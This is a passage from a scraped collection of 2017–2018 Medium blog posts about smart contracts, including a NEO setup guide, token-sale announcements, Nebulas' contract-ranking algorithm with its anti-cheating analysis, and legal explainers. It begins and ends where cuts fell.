Hyper-V feature and clicking OK, the following page will be displayed. Restart your computer to complete the installation of the the Hyper-V service.Figure 0.8. Windows Features: Restarting your\u00a0computer7. To verify the Hyper-V service is running, click the Windows start menu and enter \u201cservices.msc\u201d. You should see numerous Hyper-V services listed in the Services control panel.Figure 0.9. Services Control Panel: Hyper-V\u00a0Services8. Similarly, click the Windows start menu and enter hyper-v manager. Click the Hyper-V Manager app when it appears. Select your computer name.Figure 0.10. Hyper-V\u00a0Manager9. This completes the installation and testing of the Hyper-V service.Download and Install the Microsoft\u00a0.NET 4.7 Developer PackThe\u00a0.NET 4.7 Dev Pack is required to be able to build some components in the NEO developer toolset. If you overlook this step, Visual Studio will interupt and prompt to install this dev pack when it is required.10. Download the\u00a0.NET 4.7 Dev Pack starting here.Figure 0.11. Microsoft Knowlege Base: The\u00a0.NET Framework 4.7 Developer Pack and Language\u00a0Packs11. This will take you to the Microsoft Downloads site for the dev pack: https://www.microsoft.com/en-us/download/details.aspx?id=55168. Scroll down and click the Download button to download the installer executable.Figure 0.12. Microsoft Downloads site: Microsoft\u00a0.NET Framework 4.7 Developer Pack and Language Packs for Windows 7 SP1, Windows 8.1, Windows 10 Anniversary Update, Windows Server 2008 R2 SP1, Windows Server 2012, Windows Server 2012 R2 and Windows Server\u00a0201612. Go to your Downloads folder on your computer and double-click the NDP47-DevPack-KB3186612-ENU.exe executable.13. Click OK to run as Adminstrator for the installation process.Figure 0.13.\u00a0.NET 4.7 Dev Pack\u00a0EULA14. The install process will start.Figure 0.14.\u00a0.NET 4.7 Dev Pack Installation15. The following page will be displayed when the installation is complete.Figure 0.15.\u00a0.NET 4.7 Dev Pack Installation Complete", "responses": ""}, {"title": "BitDegree smart contract course \u201ca great entry point to our financial and educational ecosystem\u201d (MVP\u00a0demo)", "author_name": "BitDegree", "link": "https://blog.bitdegree.org/bitdegree-smart-contract-course-a-great-entry-point-to-our-financial-and-educational-ecosystem-b27946629b1c?source=search_post", "post_date": "Nov 28, 2017", "readtime": "2 min read", "upvotes": "10", "content": "BitDegree smart contract course \u201ca great entry point to our financial and educational ecosystem\u201d (MVP\u00a0demo)BitDegreeBlockedUnblockFollowFollowingNov 28, 2017BitDegree has released a demonstration smart contract course on its Minimal Viable Product (MVP) ahead of its token crowdsale on December 1st, 2017. The course and the MVP can be found on the BitDegree platform.You can check it out HERE.The demo course is based upon the smart-contract course which is being developed in conjunction with BitDegree\u2019s Cryptocurrency Advisor an nexchange.io founder, Oleg Belousov. It will teach the core concepts of the Solidity programming language, which is used to create smart contracts on the ethereum blockchain. Upon its completion, the finalized course will be taught by Belousov.The smart contract course will be aimed at beginner-level web developers who have basic programming knowledge, but would like to develop their skills, plus their understanding of blockchain. They will make progress on the course by completing a series of coding tasks in each lesson.Learners will also be able to interact with the contracts they are coding on the BitDegree platform. The course will allow learners to become more familiar with how the BitDegree token (BDG) based ecosystem worksAbout the smart contract course, Belousov commented: \u201cIt provides exceptional educational value through quality course content, and serves as a great entry point to our financial and educational ecosystem.\u201dUsing an MVP will give potential token sale participants and employers the opportunity to see how the platform will function, and how it will look.From a development perspective, having an MVP will provide BitDegree with the opportunity to gauge feedback from the platform\u2019s early adopters, or those who buy their BitDegree tokens during the very first days of the token sale. Their early engagement with the platform will allow BitDegree\u2019s developers to add or remove products based on user feedback.The MVP model assist will help BitDegree\u2019s developers correctly scale the platform\u2019s rate of growth, and has previously been used by Instagram and Uber to set a realistic development scale.After trying our MVP, please send your feedback to us at [email\u00a0protected], or having a chat with us on Telegram!", "responses": ""}, {"title": "Week in a Nutshell & Smart\u00a0Contract", "author_name": "Crowdholding", "link": "https://medium.com/@crowdholding/week-in-a-nutshell-smart-contract-ea7d1de3092c?source=search_post", "post_date": "Feb 9, 2018", "readtime": "3 min read", "upvotes": "105", "content": "Week in a Nutshell & Smart\u00a0ContractCrowdholdingBlockedUnblockFollowFollowingFeb 9, 2018This week we brought on board one new startup, Oporty, a decentralized, self-regulated knowledge-sharing community platform and service marketplace with an Escrow system and blockchain-powered contracts. We also completed a referral system that will be imbedded for users to refer friends to sign up, in return to earn bonus Yupies that will support and increase our user growth. This will be pushed on CH soon as we are testing it on our test server first.Blockchain Hub\u00a0EventEnjoying networking with pizza and\u00a0beerYesterday, we had a successful blockchain meet up organized by us and ITT out of our work space, Blockchain Hub. We had 50+ international people join the event with interesting presentations regarding different startups within the scene and including a workshop on how to be responsible with using and holding crypto. At CH it is important we give back to the community by educating and promoting blockchain and crypto. It\u2019s important to promote locally in Prague and encourage the local community to support our projects. We will be having monthly meet ups to share what we\u2019ve learned throughout this year. If you are ever in Prague, come join us. Keep up to date with our upcoming events by liking our Facebook page. Soon we will be sharing the recorded video from the event on our Youtube channel.Fun ice breaker starting the\u00a0eventSmart Contract DistributionWe apologize for the delay regarding the timeframe of the Smart Contract, but it\u2019s important we make sure the Smart contract is secure thus the auditing process should not be rushed. Right now we are presenting you with the distribution amounts that will be sent once the distribution will be initiated. For more info about the process you can read from our previous article here.Total Supply and Distribution AmountAs you see from the chart. We are showing you an example of two investors that put in the same amount, 10 ETH. One in Pre-ICO and the other in ICO at specific dates to represent time bonus. Both include amount bonus of 10%. With a total supply of 445 million and the crowdsale representing 200,250,000 YUP (45%), the multiplier for your new YUP (including bonuses) from the Old YUP amount is 49.65.Log into Crowdholding and join the co-creation revolution or drop in for a chat with us on telegram.", "responses": ""}, {"title": "Details on the Smart Contract Ranking Algorithm Part\u00a01", "author_name": "Nebulas", "link": "https://medium.com/nebulasio/details-on-the-smart-contract-ranking-algorithm-part-1-723143c689c3?source=search_post", "post_date": "May 17, 2018", "readtime": "6 min read", "upvotes": "106", "content": "Details on the Smart Contract Ranking Algorithm Part\u00a01NebulasBlockedUnblockFollowFollowingMay 17, 2018Generally, it\u2019s very difficult to say if a DApp is good or not, since there are many metrics to judge. For example, whether a DApp is interaction design smooth, whether the design is artful, or whether a DApp solves some real problem. In the final analysis, the way we rank the quality of a DApp boils down to a subjective judgement. Even algorithms are designed by humans, after all. Consequently, judging the quality of a DApp can is a controversial affair, if not a technically impossible to do perfectly. That being said, as a starting point to rank the quality of DApps on Nebulas, we choose another widely-used metric, popularity, as the metric of \u201cgoodness\u201d for each DApp.Computing the popularity of smart\u00a0contractFor a DApp, the algorithm evaluates the quality of a DApp by smart contract calling, taking into consideration the importance of different account addresses that call the DApp. In short, the greater the number of different account addresses calling a DApp, the better the DApp\u2019s ranking.Consider the DApp in to the following figure. It is called by three account addresses. To describe our methodology in simple terms, we could evaluate the popularity of this smart contract as \u201c3\u201d, because each account address contributes a unit of popularity to the smart contract.However, an account address may invoke multiple different smart contracts, which makes the contribution of the account address to the popularity of smart contracts different. Let\u2019s review the so-called \u201cpopularity\u201d metric accordingly. In fact, our calculation of popularity is to calculate how many users can be attracted by a smart contract. For the above picture, if a user\u2019s attention is 1, then the smart contract attracts 3 attention altogether.However, user attention is limited. When an account calls n smart contracts, the attention that each smart contract can attract is only 1/n. This is intuitive, because a person\u2019s time and energy are limited. We can only devote all our time and energy to a task if we do that one task all day. When we do n things, we can only devote 1/n to every thing on average.As shown in the following figure, account addresses A and B call two different smart contracts respectively, and then their contribution to the popularity of each smart contract is reduced by \u00bd. For smart contract S_1, the popularity is \u00bd + \u00bd + 1 = 2, and for smart contract S_2, its popularity is \u00bd + \u00bd = 1.Let\u2019s consider a more general case, that is, an account address may call multiple smart contracts, and each smart contract may also be called for multiple times. How should we calculate it at this time? An intuitive way is to divide the user attention according to the number of calls, where each smart contract gets the attention of the corresponding number of calls, or contribution. This process can described in mathematical language:1 ) Construct a bipartite graph, with nodes at one side being ordinary addresses and the other side\u2019s nodes being contracts.2 ) For the contract u and the ordinary address v, calculate the edge weight between them:, whereis the number of times that the ordinary address u directly or indirectly calls the contract v.3) Compute the score of contract v:Calculating the importance of account addressesIf you are careful enough, you may have realized that in the previous calculation, we have a hypothesis that each account is the same and there is no difference between accounts. In the final mathematical description, we give a parameter P_u, because the importance of each account address is different. There are different considerations about the importance of accounts in every system, which is related to the design philosophy of a system. In a system adopting PoW algorithm, like Bitcoin, an account or node with strong hash power will be considered as more important. For other systems, like EOS, an account holding a large number of tokens will be considered as more important. In Nebulas, we think that a more frequently used account address is more important, because we believe that frequent usage of Nebulas network is what ultimately gives Nebulas value. Therefore, our consideration of the importance of account address is mainly based on \u201cwhether this user frequently use Nebulas blockchain.\u201dWe consider the transfer behaviors of the following two account addresses in history, where A makes multiple transfers and has a large amount of account balance, while B has only one entry, so there is no longer activity recorded and its balance is relatively small. We can think that the account address A is more important than B.Evaluating the importance of account address is complicated. To some extent, it is similar to the evaluation method for Nebulas rank. For an account address v, the formula to calculate its importance is:Where S_v is the median balance of the account address in a time period, and R_v is the liquidity indicator of the account address. Parameters a, b, c, d, \\ mu, \\ lambda are parameters adjusted according to the actual situation.The interpretation of this formula can be divided into two parts.In the balance part of the account address, this factor is mainly introduced for cheating-proofness\u2019 sake, that is, to increase the cost of cheating. If an adversary wants to cheat, they need to hold a certain amount of money, but money can\u2019t cheat. At the same time, in order to reduce the influence of excessive account balances, we introduced the formula ( s _ v * a / ( s _ v + b ) ). The curve of this latter formula is shown in the following figure:When the account balance is infinite, the value of this formula approaches a approximately. It gets flatter when b is bigger, and steeper in the opposite case. This reflects that in reality, account balance is a factor that distinguishes the importance of an address.2. The assets circulated of the account address is the second part of the interpretation of account importance formula. This metric\u200a\u2014\u200athe activity of an address\u200a\u2014\u200aas measured as soon as a Nebulas account is in its bootstrap stage. We think that when an account consistently transfers assets in and out, it is more important for Nebulas during bootstrap stage. Therefore, the calculation formula of r _ v is as follows:In this formula, x is the transfer-in amount of the account, y is the transfer-out amount of the account, and the function is a surface, which is shown as follows:In this function, when the transfer-in and transfer-out values are equal, the maximum value is obtained. In this case, liquidity is increased to the greatest extent.It should be noted that although the value of R_v will increase as the balance increases, the influence of R_v is limited because of the introduction of an upper limit. This is a similar mechanism as the one used to constrain the influence of account balances.Please read the analysis of a actual situation and the treatment of cheating in the next episode.", "responses": ""}, {"title": "01/26 Webinar\u200a\u2014\u200aDebt Smart Contract Demonstration", "author_name": "ChronoLogic", "link": "https://blog.chronologic.network/01-26-webinar-debt-smart-contract-demonstration-c1d5e3a858ca?source=search_post", "post_date": "Jan 26, 2018", "readtime": "", "upvotes": "77", "content": "01/26 Webinar\u200a\u2014\u200aDebt Smart Contract DemonstrationChronoLogicBlockedUnblockFollowFollowingJan 26, 2018For the past few weeks our team has been working nonstop on one of the most exciting features of the ChronoLogic\u2019s Early DApp: Debt Smart Contracts. Surface to say here that this solution may as well be conceived as the future of loan in the blockchain.For this first version, the Debt Smart Contracts will be means to put into a blockchain the specific terms with a proper set of tools to accrue interest and, of course, the time for that loan.With a version already working on the Ethereum Testnet (Ropsten), in today\u2019s webinar we\u2019ll be showing all attendants how a debt smart contract can be made directly into the blockchain.For more info on that, please check out our guide on how to use ChronoLogic\u2019s Debt Smart Contract functionality. If you haven\u2019t already, take a look at our recording from January 26th\u2019s webinar below:", "responses": ""}, {"title": "Should You Wise Up to Smart Contracts?", "author_name": "Ava Chisling", "link": "https://medium.com/@avajoy/should-you-wise-up-to-smart-contracts-9ffd3d434da2?source=search_post", "post_date": "Apr 24, 2017", "readtime": "4 min read", "upvotes": "87", "content": "Should You Wise Up to Smart Contracts?Ava ChislingBlockedUnblockFollowFollowingApr 24, 2017Even if you have no idea what a smart contract is, it is entirely possible you are in one now and don\u2019t know it. That\u2019s the beauty of automation. It helps you without much fuss. Here\u2019s what you should know about smart contracts today.With the Internet of Things, an ever-increasing number of business transactions are occurring online or electronically. It makes sense that contracting would be automated.The folks at Blockgeeks say the best way to describe the process behind smart contracts and the blockchain is to think of a vending machine: Instead of going through the hassle of finding, contacting, waiting on, and of course, paying for a lawyer to draft your contract, you simply drop a bitcoin into a \u201cvending machine\u201d and everything required for the contract appears in your account. And voila! You\u2019re good to go. In addition, \u201csmart contracts not only define the rules and penalties around an agreement in the same way that a traditional contract does, [they] also automatically enforce those obligations.\u201dLike many other things that have been automated in our lifetime, the idea is that if you remove humans from much of the process, mistakes are less likely to occur, costs can be reduced, efficiency increased, and in this case, our reliance on expensive and time-consuming litigation to solve disputes is greatly lessened\u200a\u2014\u200asmart contracts take care of that, too. And all of this is run and stored on the blockchain\u2026 sometimes.Fergus Parkinson wrote his Master\u2019s thesis on finance industry applications for blockchain technology and is currently responsible for enterprise development at ROSS Intelligence. He says, \u201cSmart contracts can be pretty difficult to understand, mostly due to the fact that people have different definitions of what they are. The two things people do agree on are: a smart contract represents an agreement between two or more parties and that it\u2019s automated.\u201d With a description this vague, you don\u2019t necessarily need a blockchain to facilitate the transaction (which explains the \u201csometimes\u201d above). You can use traditional computing systems to process a smart contract, according to Parkinson. \u201cThat said, a blockchain is an accurate and immutable means of processing smart contracts, which makes it preferable.\u201dA blockchain is encrypted; its contents are continuously updated and reconciled. It is publicly shared, cannot be controlled by one person, and it can offer more security, transparency and integrity than the traditional contract\u00a0setting.According to Don Tapscott, a leader on innovation and technology and co-author of Blockchain Revolution, \u201cthe blockchain is an incorruptible digital ledger of economic transactions that can be programmed to record not just financial transactions but virtually everything of value.\u201d A blockchain is encrypted; its contents are continuously updated and reconciled. It is publicly shared, cannot be controlled by one person, and it can offer more security, transparency and integrity than the traditional contract setting.In fact, you may already be in a blockchain contract and not know it. For example, says Parkinson, \u201cRBC (Royal Bank of Canada) clients may or may not know that their loyalty plan is managed by a blockchain. Users only know that their points behave like any currency: you exchange points for goods or services as seamlessly as buying anything online.\u201dWith the Internet of Things, an ever-increasing number of business transactions are occurring online or electronically, and in order to reduce costs and improve profits, it makes sense that contracting would be automated. Plus, the more contracts people enter into, the more benefits there are to this technology. This is why certain industries where countless transactions happen between countless people, such as financial services, insurance and healthcare, have a lot to gain from this new way of doing business. Same with governmental authorities that deal on a daily basis with thousands, if not millions, of citizens for things analogous to contracts, such as permits, licenses, birth and death certificates, property ownership, and so on. It could even be used to register votes in an election.\u201cSmart contracts represent a change in the plumbing of how a lot of technology works,\u201d says Parkinson, \u201cbut the interface would be just the same. People probably wouldn\u2019t even notice, aside from maybe lower administrative costs.\u201dSays Parkinson, \u201cSmart contracts are still somewhat early days, and much like the early days of the internet innovators are finding new and creative applications for the technology every day. It\u2019s like AI in the sense that it\u2019s been around for a while but new applications are being developed for the technology.\u201d Just like smart contracts, many of us have already dealt directly with AI in some way and not know it. You may have chatted with a customer service agent, a conversation so banal, you may not have noticed he or she wasn\u2019t real, says Parkinson. \u201cThat\u2019s AI at work. Smart contracts are the same.\u201dIf you are ready to find a better way to practice law, sign up for ROSS\u00a0today.", "responses": ""}, {"title": "Indexing Your Solidity Smart Contracts", "author_name": "BlockApps", "link": "https://medium.com/@blockapps/indexing-your-solidity-smart-contracts-fc72880776e2?source=search_post", "post_date": "Aug 2, 2017", "readtime": "3 min read", "upvotes": "8", "content": "Indexing Your Solidity Smart ContractsBlockAppsBlockedUnblockFollowFollowingAug 2, 2017We\u2019ve now integrated the dashboard with our Smart Contract reporting engine Cirrus. Managing lots of contract states can become tedious as the number of smart contracts you\u2019ve deployed grows. With cirrus we expose a RESTful API that allows you to search through your smart contracts with simple query parameters.To try out this new feature set up a local installation with our developer trial, or spin up an instance on AzureNext create a new user.Then navigate to the contracts tab and create a smart contract.For this example I\u2019ll be using the trusty SimpleStorage.sol smart contractWhen uploading the contract you will notice you have an option to make the contract searchable. Under the hood what this means is that Cirrus will watch for instances of this contract being deployed and index their state.Let\u2019s go ahead and upload 3 instances of this contract. You should now see a screen that looks something like this.3 SimpleStorage.sol Smart Contracts have been\u00a0uploadedIf you click on an instance of your smart contract, you can call its methods straight from the UI. I\u2019m going to set my storage contracts to have values of 1, 10 & 100 respectively.Call smart contract methods from the dashboard UINow let\u2019s navigate to the query builder and search for SimpleStorage contracts with the value set to 10 or greater. To do this simply select the field and the type of comparison operator you would like to use. In this case I\u2019m using storedData which is the name of the storage variable in my simple storage contract and less than or equal to 10Once you\u2019ve fired off the query you can see that query URL used to fetch the data, http://localhost/cirrus/search/SimpleStorage?storedData=gte.10It\u2019s that simple. Under the hood this endpoint uses PostgREST to generate the API. Anything PostgREST supports you can use here. Give the tool a try and let us know what you think!", "responses": "1"}, {"title": "Details on the Smart Contract Ranking Algorithm Part\u00a02", "author_name": "Nebulas", "link": "https://medium.com/nebulasio/details-on-the-smart-contract-ranking-algorithm-part-2-64341011e5e5?source=search_post", "post_date": "May 17, 2018", "readtime": "5 min read", "upvotes": "74", "content": "Details on the Smart Contract Ranking Algorithm Part\u00a02NebulasBlockedUnblockFollowFollowingMay 17, 2018Analysis of Actual Situation1. A normal buyer or\u00a0sellerFor a normal buyer or seller, there will only be records of transfers-out or transfers-in the transaction network. For example, the seller delivers the goods to the buyer offline, and the buyer pays a certain amount of NAS to the seller on the Nebulas chain. We believe that these users connect the online and offline parts of the Nebulas chain. Because they contribute to the network, so we give them \u201cdevotion\u201d scores. Derived from the calculation formula, when transfer-in or transfer-out equals 0, the value of R_v increases slowly with the increase of \u201cin\u201d or \u201cout\u201d, and there is a certain upper limit to R_v.2. Accounts with lots of wealth without transactionsFor accounts with lots of wealth but no transactions, we view that they do not actually use the transaction network. In other words, both in and out are 0, so their contribution is 0. As a result, the score given by the ranking algorithm is 0.3. Exchanges with a large number of transfer\u00a0recordsFor an exchange, it will hold a certain amount of balance and a large number of transfer records at the same time. Generally speaking, it achieve a balance between in and out within a certain period of time. As a result, Nebulas will give it the largest ranking score.Cheating\uff1fThe importance of accounts will directly affect the ranking of smart contracts, thus affecting the profits of users in this activity. As a result, cheating is inevitable.In this activity, we have increased the cost of cheating to some extent, but we can\u2019t completely prevent cheating. We prefer to think about cheating from another angle. First of all, we assume that the users owning the accounts are rational. In other words, they always want to make profits, rather than be cheaters without caring about the returns. If a user tries to cheat, he needs to spend a lot of time and money. However if he can\u2019t get any return, we think that these users will not exist for a long time. The short-term opportunism of these adverse users will not affect the overall fairness. Secondly, from the perspective of game theory, we believe that in a certain degree, the cheater\u2019s behavior may contribute to continual improvement of the Nebulas, just like the relationship between search engines and optimization techniques for search engines (Google vs SEO).What happens if a user tries to cheat? At first, it is necessary for him to create a large number of account addresses and conduct transfer transactions between the addresses. Then he needs to use these account addresses to call the smart contract created by him. To simplify the discussion, let\u2019s assume that a user has 1000 NAS, and that the user can try to create 2 accounts, with 500 nas for each account. After creating the accounts, he will transfer money between two accounts, and use both the accounts to invoke the corresponding smart contract. Similarly, the user can create 4 accounts, 10 accounts and even 1000 accounts. For the convenience of calculation, we can assume that the values of a, b, c, d, \\ mu, \\ lambda above are all 1, therefore, we can calculate the final scores of this smart contract as follows:As we expected, when users create more accounts, they can effectively improve the scores of smart contracts. However, what if we adjust the values of various parameters? For example, a = 10, b = 1000, c = 1, d = 1, \\ mu = 1, \\ lambda = 1. This time, the scores of the smart contract is as follows:As we can see, with the increase of the number of accounts created by users, the score of smart contracts has a decreasing trend. That is to say, with some appropriate parameters and under the premise that the number of NAS held by users is limited, the profits obtained by creating trumpets and sharing NAS among these trumpets are shown in the following figure:That is to say, creating trumpets recklessly cannot largely increase profits. As a result, under the condition that each of the parameter is known, users will choose to cheat moderately, thus ensuring the fairness of the whole systemFurthermore, the adjustment of each parameter is determined according to the actual situation. Suppose that the user is unaware of the parameter, it is risky for users to practice frauds. For example, with another set of parameters ( b is adjusted to 100000 ), a = 10, b = 100000, c = 1, d = 1, \\ mu = 1, \\ lambda = 1, the score of this smart contract is as follows:By comparison, it is easy to find that when b = 1, the best policy for users is to create 1000 accounts, while the best policy is to create 20 ~ 100 accounts for b = 1000, and 4 accounts for b = 100000. Without knowing the specific parameters, it is risky to create more accounts rashly to improve the final score of smart contracts. As an example, consider that the user has created four accounts. At the moment, as he doesn\u2019t know the specific parameters, he can\u2019t judge whether it is wise to create more accounts to improve the final score. If he creates more accounts blindly, it may lead to the decline of his final score.To sum up, we believe that users are likely to cheat, but cheating will be very moderate, which will not affect the fairness of the whole activity. Another question is that why do we allow users to create trumpets moderately instead of guaranteeing absolute fairness? On the one hand, moderate cheating can increase the enjoyment and challenge of the activity. On the other hand, it provides a test\u200a\u2014\u200aand thus signals for means to improve\u200a\u2014\u200afor the Nebulas mainnet.Finally, in order to enhance the interest of this activity, we will announce the parameters used in the first week before the first week activity begins. Please stay tuned. As for the parameters in the following activities, whether or not they will be published will be determined later.parametersa = 2000.0b = 200000.0c = 100.0d = 1000.0\u03bc = 0.75\u03bb = 3.14", "responses": ""}, {"title": "Sagewise Publishes Index of Smart Contract and Blockchain Legislation by State as a Community Resource", "author_name": "Amy Wan", "link": "https://medium.com/sagewise/sagewise-publishes-index-of-smart-contract-and-blockchain-legislation-by-state-as-a-community-60f29da936f1?source=search_post", "post_date": "Aug 14, 2018", "readtime": "", "upvotes": "161", "content": "Sagewise Publishes Index of Smart Contract and Blockchain Legislation by State as a Community ResourceAmy WanBlockedUnblockFollowFollowingAug 14, 2018Sagewise today published an index of smart contract and blockchain legislation by state as a free community resource. The index lists proposed, pending, and passed blockchain and smart contract legislation in each of the 50 U.S. states.We welcome feedback on the index, and hope that it will help guide industry professionals as the body of blockchain and smart contract regulation in each of the U.S. states evolves.Notably, states that are eager to prove they are a friend of these new technologies have proposed and/or passed laws that basically say \u2018we love blockchain.\u2019 Tennessee\u2019s HB1507 is a good example of this: it does nothing more than legally recognize blockchain and smart contract technology.These bills have been received with mixed favorability by the blockchain community. Many\u200a\u2014\u200athough not all\u200a\u2014\u200ablockchain enthusiasts see laws as a hindrance, not as a gift, given their libertarian and anarchists sentiments. Those more friendly to legislation are worried by the fragmented legislative landscape that could result from the states making individual and varied regulatory schemes instead of the federal government creating one uniform set of regulations.Sagewise will continue to monitor legislative developments in this space.", "responses": ""}, {"title": "Contract Law and Smart Contracts", "author_name": "Craig Wright (Bitcoin SV is Bitcoin.)", "link": "https://medium.com/@craig_10243/contract-law-and-smart-contracts-1f1531f4bbd0?source=search_post", "post_date": "Dec 28, 2018", "readtime": "", "upvotes": "116", "content": "Contract Law and Smart ContractsCraig Wright (Bitcoin SV is Bitcoin.)BlockedUnblockFollowFollowingDec 28, 2018Contract law is designed to minimise:the cost of writing a contract;the cost of courts rewriting contracts;inefficiency (including behaviour) from inefficient, poorly written, or incomplete contracts.Courts use and select the rulings that lead to the fewest exculpatory clauses. Doing so leads to contracts being as short as possible and feasible, and still delivering the necessary terms and conditions.I have an old paper on some of such things here:https://papers.ssrn.com/sol3/papers.cfm?abstract_id=2957057", "responses": ""}, {"title": "What is a Smart Contract?", "author_name": "BitNautic", "link": "https://medium.com/bitnautic/what-is-a-smart-contract-b9cb323719a0?source=search_post", "post_date": "Jun 18, 2018", "readtime": "3 min read", "upvotes": "54", "content": "What is a Smart Contract?How it was born, how it works and why YOU should know all about\u00a0it.BitNauticBlockedUnblockFollowFollowingJun 18, 2018With all the hype around Blockchain, ICOs and Smart Contracts, a question naturally comes to the mind of people getting into the crypto world. What exactly is a Smart Contract?Let\u2019s quote a definition from Investopedia:Smart Contracts are self-executing contracts with the terms of the agreement between buyer and seller being directly written into lines of code. The code and the agreements contained therein exist across a distributed, decentralized blockchain network. Smart contracts permit trusted transactions and agreements to be carried out among disparate, anonymous parties without the need for a central authority, legal system, or external enforcement mechanism. They render transactions traceable, transparent, and irreversible.In a few words, Smart Contracts help you exchange money, property, shares, or anything of value in a transparent, conflict-free way while avoiding the services of a middleman. But let\u2019s start from the beginning.Background &\u00a0HistoryThe first person to propose the concept of Smart Contract was Nick Szabo, a computer scientist, legal scholar, and cryptographer who is a well respected academic with research in digital contracts and digital currency. The year was 1994, well before any blockchain technology was even in existence.Nick Szabo, in 1996, described a smart contract as \u201c a set of promises, specified in digital form, including protocols within which the parties perform on these promises\u2026\u201dWhat Nick Szabo realized was that a decentralized ledger could be used for smart contracts, otherwise called self-executing contracts, blockchain contracts, or digital contracts. In this format, contracts could be converted to computer code, stored and replicated on the system and supervised by the network of computers that run the blockchain. This would also result in ledger feedback such as transferring money and receiving the product or service.In short, you can setup a digital, binding agreement between a stranger and yourself. You do not care to trust this stranger. And that\u2019s okay! Because with smart contracts, they require no trust, as in a trustless agreement. The agreement is public knowledge (via the public ledger) and is fully transparent so both parties know what they are agreeing to.It\u2019s all programming logic at the end of the day. The outcomes are predefined in the contract which are dependent on the actions of the parties involved in the smart contract. When both parties fulfil their obligations, the smart contract will know which action to take. For example, releasing funds to the seller once the buyer confirms the delivery of the package. Take it a step further and have the funds release automatically by means of tracking the shipment via the tracking number. Want more security or peace of mind? One can require this smart contract to hold escrows by both parties to ensure no foul play is involved or they risk losing their escrow deposit.Now that the technology is mature for this kind of applications, many new companies are taking advantage of smart contracts. A great example is BitNautic, a company that is building a platform for the naval logistics industry. By using Smart contracts and blockchain technology, it\u2019s possible to design faster and safer transactions, each regulated by a smart contract that implements an escrow mechanism, with funds being hold within the smart contract until the deal is succesfully completed and all the parties are satisfied. In case of any dispute, a special team will take care of the issue and solve it in the most impartial way.Why should I\u00a0care?The market for smart contract applications is booming. With ICOs it is possible to get directly involved in the development of the products, to invest in them and to gain benefits from their progress. You can just surf around the Web, find the most promising projects and contribute by buying their tokens.You should definitely check out BitNautic\u2019s website: great Team, great idea, great market. Don\u2019t miss this one!To know more visit: BitNauticFollow BitNautic news on:InstagramFacebookTwitterLinkedinRedditJoin our Telegram:BitNautic official Telegram channel: ChannelBitNautic official #Telegram chat: Group", "responses": ""}, {"title": "Nimiq Contribution Smart\u00a0Contract", "author_name": "Team Nimiq", "link": "https://medium.com/nimiq-network/nimiq-token-sale-smart-contract-715b32c19dc2?source=search_post", "post_date": "Jun 21, 2017", "readtime": "4 min read", "upvotes": "12", "content": "Nimiq Contribution Smart\u00a0ContractNimiq Exchange Token (NET) functionality, NET Smart Contract and Security.Team NimiqBlockedUnblockFollowFollowingJun 21, 2017\u4e2d\u6587Smart ContractThe Contributions open on June 28 and will be controlled by an Ethereum Smart Contract which is available for peer-reviewing here:https://github.com/nimiq-network/nimiq-exchange-tokenOur Smart Contract is based on the contract used in the BAT Token Sale. We think they did a thorough job and their battle-tested, well-designed contract served as inspiration and guidance in following the best level of security possible.The NETThe NET is a standard ERC20 token. The ERC20 functionality is provided by StandardToken contract (defined in the StandardToken.sol file) and the basic Math functions including safety checks are provided by the SafeMath contract (defined in the SafeMath.sol file).Contract PeriodsThe contract will undergo three different periods:Creation Period: After thefundingStartBlock Ethereum Block is mined, the contract will begin the creation period accepting Ethereum contributions.Trading Period: After the Contract has been finalized, NET held by contributors become tradable. We intend to have NET listed on token exchanges such as liqui.io asap.Redeem Period: Roughly two months before the Mainnet launch we initiate the Redeem Period. We will provide a tool for you to create the Nimiq account and address to which the NET equivalent Nimiq Mainnet Tokens (NIM) are going to be deposited. This is concluded by crediting the account with the corresponding NIM in the Genesis Block of the Nimiq Mainnet Blockchain. The Exchange Rate is fixed at 1 NIM = 10 NET and the tool will lead contributors through the simple process.Contract ConditionsThe conditions controlling the Contributions are implemented in the NEToken contract (defined in the NEToken.sol file) and reflect the Contribution Terms and Conditions. Note the disclaimer that final adjustments may be made on June 24 based on market conditions.StartThe contract will begin to accept contributions at the start of the Ethereum Block, which will be announced with the deployment of the Smart Contract on the Ethereum Mainnet. The contract will issue NET to the sender\u2019s balance at these rates:First 2 Weeks (from June 28 ~1PM UTC): 1 ETH = 175 NETRemaining 2 Weeks (if applicable): 1 ETH = 125 NETRefundIf the funding period has ended and the minimum ETH CAP of 5'000ETH was not reached, contributors will be able to execute the refund function and transfer back the ETH that they participated with.StopIf the Minimum ETH CAP is met or surpassed, the contract will be finalized as soon as one of the following conditions is met:End Time: The contributions run for up to 28 days.ETH CAP: The contract will stop receiving contributions when the Maximum ETH CAP of 60'000 ETH is reached.NET CAP: The contract will stop receiving contributions when the Maximum of 10'500'000 NET are allocated in return for ETH contributions.FinalizeWhen the contract is finalized, we set the contract state toFinalized and send the received ETH for holding in a multi-sig wallet according to industry best practices.Emergency PauseIn case we detect any security issue during the contributions, the Nimiq Team can pause the contract using the MultiSig key. Unless there is a real threat to the contributions we will not use this function.RedeemOnce the Redeeming Period has started, the function redeemTokens is activated. The redeemTokensfunction, whose sole argument is the user\u2019s Nimiq Mainnet Address, registers the balance of NET to be replaced as NIM in the Genesis Block.SecurityWe take security very seriously, and it is one of the core competencies of our team.TestsThe security wizards on our dev team, Jeff, Pascal, Marvin and Philipp devoted a significant amount of time finalizing and testing our contract. We created tests for all expected scenarios, including all corner cases one can possibly think of.External Security\u00a0AuditingThe Smart Contract is being audited by German software security firm Backes Security Research & Technologies GmbH. We expect the audit result soon [Edit: released]. A final audit result will be published in case any Contribution Term numbers are changed, on June 25.Bug Bounty\u00a0RewardWith the publishing of our Smart Contract for peer-reviewing, we are announcing a Bug Bounty Reward of US$5'000 for discovery and responsible disclosure of issues that represent a tangible security threat for the contributions. Importantly, such bug reports need to classify as actually executable under a realistic attack scenario. Eligible bugs are:Security threats: incorrect ETH/NET allocationDoS: incorrect execution of the contracts through malicious actor (stuck in invalid, irrecoverable state)Logical errors: issues in the contract that lead to significant deviation from specified intention and termsDiversificationTo protect the nature of the contributions\u200a\u2014\u200aas means to deliver on the project roadmap\u200a\u2014\u200ait is necessary to diversify post closing. Once the Minimum ETH of the Smart Contract is surpassed, ETH contributions are released to the MultiSig address so that further action can be taken to diversify the holding and lower single exposure to market volatility.ConclusionIt took a few days more than we anticipated, but defining a smart contract that is responsible for securely receiving and applying contributors\u2019 funds 100% right, is challenging. We wanted to be sure that our contract is carefully designed and rigorously tested before releasing it. That is the same approach that we took for our Betanet and the approach we plan for all other upcoming releases on our roadmap.", "responses": "1"}, {"title": "Neo Smart Contract Development Tutorial - The Beginning", "author_name": "Gaurav Agrawal", "link": 